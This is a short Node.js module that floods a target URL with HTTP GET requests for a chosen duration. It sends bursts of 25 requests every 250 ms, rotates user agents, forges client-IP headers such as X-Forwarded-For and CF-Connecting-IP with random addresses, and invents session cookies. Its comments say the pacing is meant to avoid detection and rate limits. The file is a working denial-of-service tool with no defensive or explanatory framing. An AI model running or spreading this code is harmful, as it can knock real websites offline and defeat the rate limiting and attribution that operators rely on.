const http = require("http");
const https = require("https");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.6 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 Version/15.5 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Cache-Control": "no-cache",
    "Referer": `https://${hostname}/`,
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}`
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const headers = randomHeaders(url.hostname);

    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search || "/",
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] ${url.hostname}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 25; i++) send(); // less aggressive, avoid detection
    setTimeout(loop, 250); // small delay helps avoid triggering rate limits
  }

  loop();
};
